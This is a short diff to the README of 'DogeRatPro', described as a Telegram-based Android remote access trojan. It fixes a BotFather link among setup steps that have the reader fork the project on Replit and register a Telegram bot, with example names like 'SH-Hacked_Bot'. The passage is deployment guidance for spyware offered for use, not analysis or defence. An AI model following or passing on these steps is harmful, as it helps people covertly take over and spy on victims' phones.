@@ -5,7 +5,7 @@ A telegram based android RAT
 - Open <a href="https://replit.com"> Replit.</a>
 - Create account or login account
 - <a href="https://replit.com/@ShTasrif/DogeRatPro">Fork Repo</a>
-- Open your telegram then search <a href="https://t.me/@BotFather"> @BotFather</a>
+- Open your telegram then search <a href="https://t.me/BotFather"> @BotFather</a>
 - Type ```/newbot```
 - Then send your bot name. For example : SH-Hacked_Bot 
 - Send your bot username. For example sh_hacked_bot
